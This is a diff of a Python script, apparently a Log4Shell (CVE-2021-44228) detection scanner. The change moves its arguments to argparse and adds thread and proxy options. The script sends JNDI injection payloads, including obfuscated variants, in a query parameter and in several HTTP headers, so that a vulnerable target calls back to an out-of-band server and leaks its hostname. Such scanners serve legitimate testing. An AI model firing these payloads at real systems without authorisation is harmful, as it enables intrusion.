@@ -1,13 +1,26 @@
-from sys import argv
+import argparse, sys
 from requests import get
 from urllib3 import disable_warnings
 from concurrent.futures import ThreadPoolExecutor
 
-def sendDetectionRequest(url, urlId):
+class customParser(argparse.ArgumentParser):
+    def error(self, message):
+        sys.stderr.write('error: %s\n' % message)
+        self.print_help()
+        sys.exit(2)
+
+parser = customParser(prog='log4j-detect', description='Python 3 script to detect the Log4j Java library vulnerability (CVE-2021-44228)')
+parser.add_argument('u', help='Single URL / File with a list of URLs')
+parser.add_argument('s', help='Server from Burp Collaborator, interactsh or similar')
+parser.add_argument('-t', '--threads', help='Number of threads', type=int, default=15)
+parser.add_argument('-p', '--proxy', help='Send traffic through a proxy (by default, Burp)', nargs='?', default=None, const='http://127.0.0.1:8080')
+args = parser.parse_args()
+
+def sendRequest(url, urlId):
     try:
-        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + argv[2] + '/a}'
-        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
-        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + argv[2] + '}'
+        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + args.s + '/a}'
+        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + args.s + '}'
+        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + args.s + '}'
         params = {'x':payload1}
         headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
         url = url.strip()
@@ -17,20 +30,20 @@ def sendDetectionRequest(url, urlId):
         print(e)
         pass
 
-if len(argv) > 1:
-    disable_warnings()
+disable_warnings()
+if args.proxy is None:
     proxies = {}
-    # proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
-    threads = []
-    urlId = 0
-    try:
-        urlFile = open(argv[1], 'r')
-        urlList = urlFile.readlines()
-    except:
-        urlList = [argv[1]]
-    with ThreadPoolExecutor(max_workers=15) as executor:
-        for url in urlList:
-            urlId += 1
-            threads.append(executor.submit(sendDetectionRequest, url, urlId))
 else:
-    print('[!] Syntax: python3 {} <url/urlFile> <collaboratorPayload>'.format(argv[0]))
+    proxies = {"http":args.proxy, "https":args.proxy}
+threads = []
+urlId = 0
+try:
+    urlFile = open(args.u, 'r')
+    urlList = urlFile.readlines()
+    urlList = list(dict.fromkeys(urlList))
+except:
+    urlList = [args.u]
+with ThreadPoolExecutor(max_workers=args.threads) as executor:
+    for url in urlList:
+        urlId += 1
+        threads.append(executor.submit(sendRequest, url, urlId))
